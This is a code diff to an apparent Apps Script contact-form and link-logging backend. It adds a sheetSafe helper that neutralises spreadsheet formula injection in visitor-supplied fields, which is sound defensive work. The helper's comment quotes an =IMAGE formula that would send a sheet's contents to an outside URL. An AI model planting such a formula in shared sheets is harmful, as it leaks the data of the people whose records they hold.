@@ -190,7 +190,7 @@ function doPost(e) {
         sh.getRange(1, 1, 1, header.length).setValues([header]);
       }
     }
-    sh.appendRow(FIELDS.map(function (fld) { var v = rec[fld[1]]; return v == null ? '' : v; }));
+    sh.appendRow(FIELDS.map(function (fld) { var v = rec[fld[1]]; return v == null ? '' : sheetSafe(v); }));
 
     var html = '<h2 style="font-family:Arial,sans-serif;color:#4c1d95">New message from karan98.in</h2>' +
       '<table cellpadding="6" style="border-collapse:collapse;font-family:Arial,sans-serif;font-size:14px">';
@@ -745,7 +745,7 @@ function urlshortAppend(ss, name, cols, events) {
     sh.setFrozenRows(1);
   }
   var rows = events.map(function (e) {
-    return cols.map(function (c) { var v = c[1](e); return v == null ? '' : v; });
+    return cols.map(function (c) { var v = c[1](e); return v == null ? '' : sheetSafe(v); });
   });
   sh.getRange(sh.getLastRow() + 1, 1, rows.length, cols.length).setValues(rows);
 }
@@ -802,6 +802,14 @@ function installShortLinkSync() {
 }
 
 /* ------------------------------- helpers --------------------------------- */
+
+// A cell written from text that starts with = + - or @ is read as a formula. A visitor
+// decides much of what lands in these rows (a message, a User-Agent, a Referer), and
+// =IMAGE("https://…?"&A2) would send the Sheet's contents away when it is opened. A
+// leading apostrophe keeps such text as text, and Sheets doesn't show it.
+function sheetSafe(v) {
+  return typeof v === 'string' && /^[=+\-@\t\r]/.test(v) ? "'" + v : v;
+}
 
 function deob(b64, key) {
   var bytes = Utilities.base64Decode(b64);
